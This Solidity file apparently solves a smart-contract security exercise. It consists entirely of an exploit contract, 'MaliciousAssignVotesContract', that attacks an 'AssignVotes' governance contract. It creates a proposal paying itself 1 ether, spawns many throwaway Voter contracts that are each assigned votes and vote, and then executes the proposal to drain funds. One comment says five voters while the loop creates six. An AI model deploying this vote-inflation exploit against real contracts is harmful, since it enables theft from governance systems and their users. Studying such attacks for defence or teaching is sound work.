// SPDX-License-Identifier: MIT
pragma solidity 0.8.15;

import "./AssignVotes.sol";

contract MaliciousAssignVotesContract {
    AssignVotes immutable victim;

    constructor(address _victimAdd) {
        // Initialize the victim contract
        victim = AssignVotes(_victimAdd);

        // Get the current proposal number
        uint256 proposalNumber = victim.proposalCounter();

        // Create a proposal to assign votes to this contract
        victim.createProposal(address(this), "", 1 ether);

        // Create two ProposalVoterCreator contracts to assign voters to the proposal
        ProposalVoterCreator proposalVoterCreator0 = new ProposalVoterCreator(
            _victimAdd,
            proposalNumber
        );
        ProposalVoterCreator proposalVoterCreator1 = new ProposalVoterCreator(
            _victimAdd,
            proposalNumber
        );

        // Execute the proposal
        victim.execute(proposalNumber);
    }

    receive() external payable {}
}

// Contract to create voters for a proposal
contract ProposalVoterCreator {
    AssignVotes immutable victim;

    constructor(address _victimAdd, uint256 _proposalNumber) {
        victim = AssignVotes(_victimAdd);

        // Create five Voter contracts to vote on the proposal
        for (uint8 i; i < 6; i++) {
            Voter voterI = new Voter(_victimAdd);

            victim.assign(address(voterI));

            // Vote on the proposal using the voter contract
            voterI.vote(_proposalNumber);
        }
    }
}

contract Voter {
    AssignVotes immutable victim;

    constructor(address _victimAdd) {
        victim = AssignVotes(_victimAdd);
    }

    // Vote on a proposal using this voter contract
    function vote(uint256 proposalNum) external {
        victim.vote(proposalNum);
    }
}
